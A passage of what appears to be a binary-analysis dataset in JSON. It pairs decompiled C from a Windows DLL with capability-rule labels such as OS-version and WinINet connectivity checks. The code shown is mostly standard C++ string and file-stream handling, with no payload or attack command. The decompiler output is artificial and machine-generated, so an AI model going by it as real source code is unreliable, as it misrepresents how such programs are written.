pppppiVar5 = fcn.180011cf0(&pppppiStack136, uVar18 + 1);\n            pppppiStack136 = pppppiVar5;\n            fcn.1800ade80(pppppiVar5, ppiVar15, piVar10 * 2 + 2);\n            uStack112 = uVar18;\n        }\n        piStack120 = piVar10;\n        fcn.18000b420(pppppiVar5, &pppppiStack136);\n        if (iVar2 == 1) {\n            uVar4 = 0x110;\n            fcn.1800ae290(apcStack696, 0, 0x110);\n            fcn.18000f280(apcStack696, arg2, uVar4, in_R9);\n            if ((*(auStack680 + *(apcStack696[0] + 4)) & 6) == 0) {\n                ppcStack872 = apcStack696;\n                piVar10 = *(apiStack624 + *(apcStack696[0] + 4));\n                if (piVar10 != NULL) {\n                    (**(*piVar10 + 8))();\n                }\n                uStack864 = fcn.180012070(apcStack696);\n                iVar7 = -1;\n                if ((*(auStack680 + *(apcStack696[0] + 4)) & 6) == 0) {\n                    piVar10 = *(apiStack624 + *(apcStack696[0] + 4));\n                    uStack920 = 1;\n                    in_R9 = 1;\n                    (**(*piVar10 + 0x50))(piVar10, &iStack904, 0);\n                    piVar10 = *(apiStack624 + *(apcStack696[0] + 4));\n                }\n                else {\n                    iStack904 = -1;\n                    uStack900 = 0xffffffff;\n                    iStack896 = SUB164(ZEXT816(0), 0);\n                    iStack896 = 0;\n                    uStack892 = SUB164(ZEXT816(0) >> 0x20, 0);\n                    uStack892 = 0;\n                    uStack888 = 0;\n                    piVar10 = *(apiStack624 + *(apcStack696[0] + 4));\n                }\n                if (piVar10 != NULL) {\n                    (**(*piVar10 + 0x10))();\n                }\n                uStack88 = 0;\n                uStack80 = 0xf;\n                apppppuStack104[0] = apppppuStack104[0] & 0xffffffffffffff00;\n                iVar12 = iStack896 + iStack904 + -3;\n                fcn.180010fa0(apppppuStack104, iVar12);\n                iStack904 = 3;\n                uStack900 = 0;\n                iStack896 = 0;\n                uStack892 = 0;\n                uStack888 = 0;\n                fcn.180010140(apcStack696, &iStack904);\n                pppppuVar13 = apppppuStack104;\n                if (0xf < uStack80) {\n                    pppppuVar13 = apppppuStack104[0];\n                }\n                fcn.180010250(apcStack696, pppppuVar13, iVar12);\n                iVar12 = fcn.180011c30(auStack680);\n                if (iVar12 == 0) {\n                    iVar12 = *(apcStack696[0] + 4);\n                    uVar14 = 6;\n                    if (*(apiStack624 + iVar12) != 0) {\n                        uVar14 = 2;\n                    }\n                    fcn.1800037a0(iVar12 + apcStack696, uVar14 | *(auStack680 + iVar12));\n                }\n                pppppuVar13 = apppppuStack104;\n                if (0xf < uStack80) {\n                    pppppuVar13 = apppppuStack104[0];\n                }\n                piStack120 = NULL;\n                uStack112 = 0xf;\n                pppppiStack136 = pppppiStack136 & 0xffffffffffffff00;\n                do {\n                    iVar7 = iVar7 + 1;\n                } while (*(pppppuVar13 + iVar7) != '\\0');\n                fcn.180011120(&pppppiStack136, pppppuVar13, iVar7);\n                uVar4 = 0x108;\n                fcn.1800ae290(&pcStack408, 0, 0x108);\n                fcn.18000f150(&pcStack408, arg2, uVar4, in_R9);\n                if ((auStack392[*(pcStack408 + 4)] & 6) == 0) {\n                    pppppiVar5 = &pppppiStack136;\n                    if (0xf < uStack112) {\n                        pppppiVar5 = pppppiStack136;\n                    }\n                    fcn.18000fff0(&pcStack408, pppppiVar5, piStack120);\n                }\n                *(auStack400 + *(pcStack408 + 4) + -8) =\n                     vtable.std::basic_ofstream_char__struct_std::char_traits_char__.0;\n                *(&iStack412 + *(pcStack408 + 4)) = *(pcStack408 + 4) + -0xa8;\n                fcn.18000ff30(auStack400);\n                *(auStack400 + *(pcStack408 + 4) + -8) =\n                     vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n                *(&iStack412 + *(pcStack408 + 4)) = *(pcStack408 + 4) + -0x10;\n                apcStack240[0] = vtable.std::ios_base.0;\n                fcn.180073e6c(apcStack240);\n                if (0xf < uStack112) {\n                    pppppiVar5 = pppppiStack136;\n                    if ((0xfff < uStack112 + 1) &&\n                       (pppppiVar5 = pppppiStack136[-1],  0x1f < pppppiStack136 + (-8 - pppppiVar5)))\n                    goto code_r0x00018000cfc8;\n                    fcn.18008fb24(pppppiVar5);\n                }\n                piStack120 = NULL;\n                uStack112 = 0xf;\n                pppppiStack136 = pppppiStack136 & 0xffffffffffffff00;\n                if (0xf < uStack80) {\n                    pppppuVar13 = apppppuStack104[0];\n                    if ((0xfff < uStack80 + 1) &&\n                       (pppppuVar13 = apppppuStack104[0][-1],  0x1f < apppppuStack104[0] + (-8 - pppppuVar13))) {\n                        fcn.1800b3528();\n                        goto code_r0x00018000cfa4;\n                    }\n                    fcn.18008fb24(pppppuVar13);\n                }\n            }\n            *(apcStack696 + *(apcStack696[0] + 4)) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n            *(&iStack700 + *(apcStack696[0] + 4)) = *(apcStack696[0] + 4) + -0xb0;\n            fcn.18000ff30(auStack680);\n            *(apcStack696 + *(apcStack696[0] + 4)) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n            *(&iStack700 + *(apcStack696[0] + 4)) = *(apcStack696[0] + 4) + -0x18;\n            apcStack520[0] = vtable.std::ios_base.0;\n            fcn.180073e6c(apcStack520);\n        }\n        else if (iVar2 - 2U < 2) {\n            fcn.1800ae290(apcStack696, 0, 0x110);\n            ppiVar15 = arg2;\n            if (0x7 < arg2[3]) {\n                ppiVar15 = *arg2;\n            }\n            fcn.180011470(apcStack696, ppiVar15, 0x24);\n            *(apcStack696 + *(apcStack696[0] + 4)) =\n                 vtable.std::basic_ifstream_wchar_t__struct_std::char_traits_wchar_t__.0;\n            *(&iStack700 + *(apcStack696[0] + 4)) = *(apcStack696[0] + 4) + -0xb0;\n            iVar2 = *(apcStack696[0] + 4);\n            if ((*(auStack680 + iVar2) & 6) == 0) {\n                arg1 = fcn.18008fb2c(0x40);\n                ppcStack72 = arg1;\n                fcn.180002670(arg1);\n                *arg1 = vtable.std::codecvt_utf16_wchar_t__1114111__4_.0;\n                piVar10 = *(*(&iStack632 + *(apcStack696[0] + 4)) + 8);\n                iStack896 = piVar10;\n                uStack892 = piVar10 >> 0x20;\n                (**(*piVar10 + 8))(piVar10);\n                piVar6 = fcn.180073d14(piVar10);\n                piStack848 = piVar6;\n                if (*0x1801286f8 == 0) {\n                    fcn.18006da30(&ppcStack72, 0);\n                    if (*0x1801286f8 == 0) {\n                        *0x1801286b8 = *0x1801286b8 + 1;\n                        *0x1801286f8 = *0x1801286b8;\n                    }\n                    fcn.18006dab0(&ppcStack72);\n                }\n                fcn.180071848(piVar6, arg1, *0x1801286f8);\n                piVar6 = piStack848;\n                *(piStack848 + 4) = 0;\n                iVar7 = piStack848[5];\n                if (iVar7 != 0x1800f45a0) {\n                    if (iVar7 != 0) {\n                        fcn.1800b2bb8(iVar7);\n                    }\n                    piVar6[5] = 0;\n                    pcVar16 = 0x1800f45a0;\n                    do {\n                        pcVar17 = pcVar16;\n                        pcVar16 = pcVar17 + 1;\n                    } while (*pcVar16 != '\\0');\n                    pcVar17 = pcVar17 + -0x1800f459e;\n                    iVar7 = fcn.1800b35a0(pcVar17);\n                    piVar6[5] = iVar7;\n                    if (iVar7 != 0) {\n                        fcn.1800ade80(iVar7, 0x1800f45a0, pcVar17);\n                    }\n                }\n                fcn.18000efc0(apcStack696 + iVar2, &ppcStack872, &iStack856);\n                if ((CONCAT71(Stack863, uStack864) != NULL) &&\n                   (puVar8 = (**(*CONCAT71(Stack863, uStack864) + 0x10))(),  puVar8 != NULL)) {\n                    (***puVar8)(puVar8);\n                }\n                if ((piStack848 != NULL) && (puVar8 = (**(*piStack848 + 0x10))(),  puVar8 != NULL)) {\n                    (***puVar8)(puVar8);\n                }\n                puVar8 = (**(*piVar10 + 0x10))(piVar10);\n                if (puVar8 != NULL) {\n                    (***puVar8)(puVar8);\n                }\n                ppcStack872 = apcStack696;\n                if (*(apiStack624 + *(apcStack696[0] + 4)) != NULL) {\n                    (**(**(apiStack624 + *(apcStack696[0] + 4)) + 8))();\n                }\n                uStack864 = fcn.180011d60(apcStack696);\n                iVar7 = -1;\n                if ((*(auStack680 + *(apcStack696[0] + 4)) & 6) == 0) {\n                    piVar10 = *(apiStack624 + *(apcStack696[0] + 4));\n                    uStack920 = 1;\n                    (**(*piVar10 + 0x50))(piVar10, &iStack904, 0, 1);\n                    piVar10 = *(apiStack624 + *(apcStack696[0] + 4));\n                }\n                else {\n                    iStack904 = -1;\n                    uStack900 = 0xffffffff;\n                    iStack896 = SUB164(ZEXT816(0), 0);\n                    iStack896 = 0;\n                    uStack892 = SUB164(ZEXT816(0) >> 0x20, 0);\n                    uStack892 = 0;\n                    uStack888 = 0;\n                    piVar10 = *(apiStack624 + *(apcStack696[0] + 4));\n                }\n                if (piVar10 != NULL) {\n                    (**(*piVar10 + 0x10))();\n                }\n                uVar18 = iStack904 + iStack896;\n                uStack88 = 0;\n                uStack80 = 7;\n                apppppuStack104[0] = apppppuStack104[0] & 0xffffffffffff0000;\n                if (uVar18 < 8) {\n                    uStack88 = uVar18;\n                    if (iStack904 + iStack896 != 0) {\n                        pppppuVar13 = apppppuStack104;\n                        for (uVar11 = uVar18; uVar11 != 0; uVar11 = uVar11 - 1) {\n                            *pppppuVar13 = 0;\n                            pppppuVar13 = pppppuVar13 + 2;\n                        }\n                    }\n                    *(apppppuStack104 + uVar18 * 2) = 0;\n                }\n                else {\n                    if (0x7ffffffffffffffe < uVar18) goto code_r0x00018000cfb0;\n                    uVar9 = uVar18 | 7;\n                    uVar11 = 0x7ffffffffffffffe;\n                    if ((uVar9 < 0x7fffffffffffffff) && (uVar11 = uVar9,  uVar9 < 10)) {\n                        uVar11 = 10;\n                    }\n                    iVar12 = uVar11 + 1;\n                    if (uVar11 == 0xffffffffffffffff) {\n                        iVar12 = -1;\n                    }\n                    apppppuStack104[0] = fcn.180011cf0(apppppuStack104, iVar12);\n                    uStack88 = uVar18;\n                    uStack80 = uVar11;\n                    pppppuVar13 = apppppuStack104[0];\n                    for (uVar11 = uVar18; uVar11 != 0; uVar11 = uVar11 - 1) {\n                        *pppppuVar13 = 0;\n                        pppppuVar13 = pppppuVar13 + 2;\n                    }\n                    *(apppppuStack104[0] + uVar18 * 2) = 0;\n                }\n                iVar2 = 0;\n                uVar19 = 0;\n                iVar20 = 0;\n                uVar21 = 0;\n                uStack840 = 0;\n                iVar12 = *(apcStack696[0] + 4);\n                uVar3 = *(auStack680 + iVar12) & 0xfffffffe;\n                uVar14 = uVar3 | 4;\n                if (*(apiStack624 + iVar12) != 0) {\n                    uVar14 = uVar3;\n                }\n                fcn.1800037a0(iVar12 + apcStack696, uVar14);\n                ppcStack872 = apcStack696;\n                if (*(apiStack624 + *(apcStack696[0] + 4)) != NULL) {\n                    (**(**(apiStack624 + *(apcStack696[0] + 4)) + 8))();\n                }\n                uStack864 = fcn.180011d60(apcStack696);\n                if ((*(auStack680 + *(apcStack696[0] + 4)) & 6) == 0) {\n                    piVar10 = *(apiStack624 + *(apcStack696[0] + 4));\n                    uStack888 = uStack840;\n                    iStack904 = iVar2;\n                    uStack900 = uVar19;\n                    iStack896 = iVar20;\n                    uStack892 = uVar21;\n                    (**(*piVar10 + 0x58))(piVar10, &iStack856, &iStack904, 1);\n                    if (piStack848 + iStack856 == -1) {\n                        iVar12 = *(apcStack696[0] + 4);\n                        uVar14 = 6;\n                        if (*(apiStack624 + iVar12) != 0) {\n                            uVar14 = 2;\n                        }\n                        fcn.1800037a0(iVar12 + apcStack696, uVar14 | *(auStack680 + iVar12));\n                    }\n                }\n                if (*(apiStack624 + *(apcStack696[0] + 4)) != NULL) {\n                    (**(**(apiStack624 + *(apcStack696[0] + 4)) + 0x10))();\n                }\n                pppppuVar13 = apppppuStack104;\n                if (7 < uStack80) {\n                    pppppuVar13 = apppppuStack104[0];\n                }\n                fcn.18000eb20(apcStack696, pppppuVar13, uVar18);\n                iVar12 = fcn.180011920(auStack680);\n                if (iVar12 == 0) {\n                    iVar12 = *(apcStack696[0] + 4);\n                    uVar14 = 6;\n                    if (*(apiStack624 + iVar12) != 0) {\n                        uVar14 = 2;\n                    }\n                    fcn.1800037a0(iVar12 + apcStack696, uVar14 | *(auStack680 + iVar12));\n                }\n                uVar4 = fcn.1800687b0(auStack824);\n                pppppuVar13 = apppppuStack104;\n                if (7 < uStack80) {\n                    pppppuVar13 = apppppuStack104[0];\n                }\n                arg4 = pppppuVar13 + uStack88 * 2;\n                fcn.180068c50(uVar4, &iStack904, pppppuVar13, arg4);\n                fcn.1800686c0(auStack824);\n                arg2_00 = &iStack904;\n                if (0xf < uStack880) {\n                    arg2_00 = CONCAT44(uStack900, iStack904);\n                }\n                piStack120 = NULL;\n                uStack112 = 0xf;\n                pppppiStack136 = pppppiStack136 & 0xffffffffffffff00;\n                do {\n                    iVar7 = iVar7 + 1;\n                } while (*(arg2_00 + iVar7) != '\\0');\n                fcn.180011120(&pppppiStack136, arg2_00, iVar7);\n                if (0xf < uStack880) {\n                    iVar12 = CONCAT44(uStack900, iStack904);\n                    iVar7 = iVar12;\n                    if ((0xfff < uStack880 + 1) && (iVar7 = *(iVar12 + -8),  0x1f < (iVar12 - iVar7) - 8U))\n                    goto code_r0x00018000cfb6;\n                    fcn.18008fb24(iVar7);\n                }\n                uVar4 = 0x108;\n                fcn.1800ae290(&pcStack408, 0, 0x108);\n                fcn.18000f150(&pcStack408, arg2, uVar4, arg4);\n                if ((auStack392[*(pcStack408 + 4)] & 6) == 0) {\n                    pppppiVar5 = &pppppiStack136;\n                    if (0xf < uStack112) {\n                        pppppiVar5 = pppppiStack136;\n                    }\n                    fcn.18000fff0(&pcStack408, pppppiVar5, piStack120);\n                }\n                *(auStack400 + *(pcStack408 + 4) + -8) =\n                     vtable.std::basic_ofstream_char__struct_std::char_traits_char__.0;\n                *(&iStack412 + *(pcStack408 + 4)) = *(pcStack408 + 4) + -0xa8;\n                fcn.18000ff30(auStack400);\n                *(auStack400 + *(pcStack408 + 4) + -8) =\n                     vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n                *(&iStack412 + *(pcStack408 + 4)) = *(pcStack408 + 4) + -0x10;\n                apcStack240[0] = vtable.std::ios_base.0;\n                fcn.180073e6c(apcStack240);\n                if (0xf < uStack112) {\n                    pppppiVar5 = pppppiStack136;\n                    if ((0xfff < uStack112 + 1) &&\n                       (pppppiVar5 = pppppiStack136[-1],  0x1f < pppppiStack136 + (-8 - pppppiVar5)))\n                    goto code_r0x00018000cfbc;\n                    fcn.18008fb24(pppppiVar5);\n                }\n                piStack120 = NULL;\n                uStack112 = 0xf;\n                pppppiStack136 = pppppiStack136 & 0xffffffffffffff00;\n                if (7 < uStack80) {\n                    pppppuVar13 = apppppuStack104[0];\n                    if ((0xfff < uStack80 * 2 + 2) &&\n                       (pppppuVar13 = apppppuStack104[0][-1],  0x1f < apppppuStack104[0] + (-8 - pppppuVar13)))\n                    goto code_r0x00018000cfc2;\n                    fcn.18008fb24(pppppuVar13);\n                }\n            }\n            *(apcStack696 + *(apcStack696[0] + 4)) =\n                 vtable.std::basic_ifstream_wchar_t__struct_std::char_traits_wchar_t__.0;\n            *(&iStack700 + *(apcStack696[0] + 4)) = *(apcStack696[0] + 4) + -0xb0;\n            fcn.18000ea60(auStack680);\n            *(apcStack696 + *(apcStack696[0] + 4)) =\n                 vtable.std::basic_istream_wchar_t__struct_std::char_traits_wchar_t__.0;\n            *(&iStack700 + *(apcStack696[0] + 4)) = *(apcStack696[0] + 4) + -0x18;\n            apcStack520[0] = vtable.std::ios_base.0;\n            fcn.180073e6c(apcStack520);\n        }\n        pppppiVar5 = &pppppiStack136;\n        uVar4 = fcn.18000da90(pppppiVar5, arg2);\n        fcn.18000bd70(pppppiVar5, uVar4);\n        if (0x7 < arg2[3]) {\n            piVar10 = *arg2;\n            piVar6 = piVar10;\n            if ((0xfff < arg2[3] * 2 + 2U) && (piVar6 = piVar10[-1],  0x1f < piVar10 + (-8 - piVar6))) {\ncode_r0x00018000cfa4:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18008fb24(piVar6);\n        }\n    }\ncode_r0x00018000cf59:\n    *arg2 = 0;\n    arg2[3] = 0x7;\n    arg2[2] = NULL;\n    fcn.18008fb00(uStack64 ^ auStack952);\n    return;\n}\n",
        "token_count": 6569
    },
    "18000d40": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000d400(int64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    ulong *puVar4;\n    \n    if (*arg1 != 0) {\n        LOCK();\n        piVar1 = *arg1 + 0x2c;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 == 1) {\n            puVar4 = *arg1;\n            while (puVar4 != NULL) {\n                puVar3 = puVar4[2];\n                puVar4[2] = 0;\n                (***puVar4)(puVar4, 1);\n                puVar4 = puVar3;\n            }\n        }\n    }\n    *arg1 = 0;\n    if ((arg1[4] != NULL) && (puVar4 = (**(*arg1[4] + 0x10))(),  puVar4 != NULL)) {\n    // WARNING: Could not recover jumptable at 0x00018000d488. Too many branches\n    // WARNING: Treating indirect jump as call\n        (***puVar4)(puVar4, 1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "18000d4c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar ** fcn.18000d4c0(char **arg1, char *arg2)\n\n{\n    char cVar1;\n    char *arg1_00;\n    char *pcVar2;\n    \n    pcVar2 = *arg1;\n    if (pcVar2 != arg2) {\n        if (pcVar2 != NULL) {\n            fcn.1800b2bb8(pcVar2);\n        }\n        *arg1 = NULL;\n        if (arg2 != NULL) {\n            cVar1 = *arg2;\n            pcVar2 = arg2;\n            while (cVar1 != '\\0') {\n                pcVar2 = pcVar2 + 1;\n                cVar1 = *pcVar2;\n            }\n            arg1_00 = fcn.1800b35a0(pcVar2 + (1 - arg2));\n            *arg1 = arg1_00;\n            if (arg1_00 != NULL) {\n                fcn.1800ade80(arg1_00, arg2, pcVar2 + (1 - arg2));\n            }\n            return arg1;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 248
    },
    "18000d6f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000d6f0(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    int64_t *piVar5;\n    ushort in_DX;\n    int64_t iVar6;\n    int64_t *piVar7;\n    \n    piVar2 = arg1[2];\n    piVar3 = arg1[3];\n    if (piVar2 < piVar3) {\n        arg1[2] = piVar2 + 1;\n        if (0x7 < piVar3) {\n            arg1 = *arg1;\n        }\n        *(arg1 + piVar2 * 2) = in_DX;\n        *(arg1 + piVar2 * 2 + 2) = 0;\n        return;\n    }\n    if (piVar2 == 0x7ffffffffffffffe) {\n        fcn.180014b60();\n        pcVar4 = swi(3);\n        (*pcVar4)();\n        return;\n    }\n    piVar5 = piVar2 + 1U | 7;\n    piVar7 = 0x7ffffffffffffffe;\n    if (((piVar5 < 0x7fffffffffffffff) && (piVar3 <= 0x7ffffffffffffffe - (piVar3 >> 1))) &&\n       (piVar1 = (piVar3 >> 1) + piVar3,  piVar7 = piVar5,  piVar5 < piVar1)) {\n        piVar7 = piVar1;\n    }\n    iVar6 = piVar7 + 1;\n    if (piVar7 == 0xffffffffffffffff) {\n        iVar6 = -1;\n    }\n    piVar5 = fcn.180011cf0(arg1, iVar6);\n    iVar6 = piVar2 * 2;\n    arg1[2] = piVar2 + 1U;\n    arg1[3] = piVar7;\n    if (piVar3 < 0x8) {\n        fcn.1800ade80(piVar5, arg1, iVar6);\n        *(iVar6 + piVar5) = in_DX;\n        *(iVar6 + 2 + piVar5) = 0;\n    }\n    else {\n        piVar2 = *arg1;\n        fcn.1800ade80(piVar5, piVar2, iVar6);\n        *(iVar6 + piVar5) = in_DX;\n        *(iVar6 + 2 + piVar5) = 0;\n        piVar7 = piVar2;\n        if (0xfff < piVar3 * 2 + 2U) {\n            piVar7 = piVar2[-1];\n            if (0x1f < piVar2 + (-8 - piVar7)) {\n                fcn.1800b3528(piVar7, piVar3 * 2 + 0x29);\n                pcVar4 = swi(3);\n                (*pcVar4)();\n                return;\n            }\n        }\n        fcn.18008fb24(piVar7);\n    }\n    *arg1 = piVar5;\n    return;\n}\n",
        "token_count": 696
    },
    "18000eb2": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.18000eb20(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    arg1[1] = 0;\n    piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    cVar3 = fcn.180011d60(arg1);\n    uVar4 = 0;\n    if ((cVar3 != '\\0') && (0 < arg3)) {\n        piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n        iVar5 = (**(*piVar1 + 0x40))(piVar1, arg2, arg3);\n        arg1[1] = arg1[1] + iVar5;\n        uVar4 = 0;\n        if (iVar5 != arg3) {\n            uVar4 = 3;\n        }\n    }\n    iVar5 = *(*arg1 + 4) + arg1;\n    uVar4 = *(iVar5 + 0x10) | uVar4;\n    uVar2 = uVar4 | 4;\n    if (*(iVar5 + 0x48) != 0) {\n        uVar2 = uVar4;\n    }\n    fcn.1800037a0(iVar5, uVar2);\n    piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0x10))();\n    }\n    return arg1;\n}\n",
        "token_count": 401
    },
    "18000ec1": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint16_t fcn.18000ec10(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    int64_t arg1_00;\n    \n    uVar6 = 0;\n    arg1[1] = 0;\n    piVar2 = *(*(*arg1 + 4) + 0x48 + arg1);\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))();\n    }\n    cVar4 = fcn.180011d60(arg1);\n    if (cVar4 == '\\0') {\n        iVar5 = -1;\n        uVar6 = 0;\n        goto code_r0x00018000ecff;\n    }\n    piVar2 = *(*(*arg1 + 4) + 0x48 + arg1);\n    if ((*piVar2[7] == NULL) || (*piVar2[10] < 1)) {\n        iVar5 = (**(*piVar2 + 0x30))();\n    }\n    else {\n        iVar5 = **piVar2[7];\n    }\n    if (iVar5 == -1) {\n        uVar6 = 3;\n        goto code_r0x00018000ecff;\n    }\n    piVar2 = *(*(*arg1 + 4) + 0x48 + arg1);\n    if (*piVar2[7] == 0) {\ncode_r0x00018000ece5:\n        (**(*piVar2 + 0x38))();\n    }\n    else {\n        iVar1 = *piVar2[10];\n        if (iVar1 < 1) goto code_r0x00018000ece5;\n        *piVar2[10] = iVar1 + -1;\n        *piVar2[7] = *piVar2[7] + 2;\n    }\n    arg1[1] = arg1[1] + 1;\ncode_r0x00018000ecff:\n    arg1_00 = *(*arg1 + 4) + arg1;\n    uVar6 = *(arg1_00 + 0x10) | uVar6;\n    uVar3 = uVar6 | 4;\n    if (*(arg1_00 + 0x48) != 0) {\n        uVar3 = uVar6;\n    }\n    fcn.1800037a0(arg1_00, uVar3);\n    piVar2 = *(*(*arg1 + 4) + 0x48 + arg1);\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 0x10))();\n    }\n    return iVar5;\n}\n",
        "token_count": 613
    },
    "18000fff": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.18000fff0(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    uVar4 = 0;\n    iVar5 = *arg1;\n    piVar1 = *(*(iVar5 + 4) + 0x48 + arg1);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n        iVar5 = *arg1;\n    }\n    if (((*(*(iVar5 + 4) + 0x10 + arg1) == 0) && (piVar1 = *(*(iVar5 + 4) + 0x50 + arg1),  piVar1 != NULL)) &&\n       (piVar1 != arg1)) {\n        fcn.180011f50(piVar1);\n        iVar5 = *arg1;\n    }\n    if (*(*(iVar5 + 4) + 0x10 + arg1) == 0) {\n        if (0 < arg3) {\n            piVar1 = *(*(iVar5 + 4) + 0x48 + arg1);\n            iVar5 = (**(*piVar1 + 0x48))(piVar1, arg2, arg3);\n            uVar4 = 0;\n            if (iVar5 != arg3) {\n                uVar4 = 4;\n            }\n        }\n    }\n    else {\n        uVar4 = 4;\n    }\n    iVar5 = *(*arg1 + 4) + arg1;\n    uVar4 = *(iVar5 + 0x10) | uVar4;\n    uVar2 = uVar4 | 4;\n    if (*(iVar5 + 0x48) != 0) {\n        uVar2 = uVar4;\n    }\n    fcn.1800037a0(iVar5, uVar2);\n    cVar3 = fcn.180073e64();\n    if (cVar3 == '\\0') {\n        fcn.180012010(arg1);\n    }\n    piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0x10))();\n    }\n    return arg1;\n}\n",
        "token_count": 529
    },
    "18001014": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.180010140(int64_t *arg1, uint *arg2)\n\n{\n    int64_t *piVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    int64_t *piVar7;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    ulong uStack56;\n    int64_t iStack40;\n    int64_t iStack32;\n    \n    uVar6 = 0xfffffffffffffffe;\n    iVar5 = *(*arg1 + 4) + arg1;\n    uVar3 = *(iVar5 + 0x10) & 0xfffffffe;\n    uVar4 = uVar3 | 4;\n    if (*(iVar5 + 0x48) != 0) {\n        uVar4 = uVar3;\n    }\n    fcn.1800037a0(iVar5, uVar4);\n    piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n    piVar7 = arg1;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    uVar2 = fcn.180012070(arg1);\n    if ((*(*(*arg1 + 4) + 0x10 + arg1) & 6) == 0) {\n        piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n        uStack72 = *arg2;\n        uStack68 = arg2[1];\n        uStack64 = arg2[2];\n        uStack60 = arg2[3];\n        uStack56 = *(arg2 + 4);\n        (**(*piVar1 + 0x58))(piVar1, &iStack40, &uStack72, 1, uVar6, piVar7, uVar2);\n        if (iStack32 + iStack40 == -1) {\n            iVar5 = *(*arg1 + 4) + arg1;\n            uVar4 = 6;\n            if (*(iVar5 + 0x48) != 0) {\n                uVar4 = 2;\n            }\n            fcn.1800037a0(iVar5, uVar4 | *(iVar5 + 0x10));\n        }\n    }\n    piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0x10))();\n    }\n    return arg1;\n}\n",
        "token_count": 583
    },
    "18001025": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
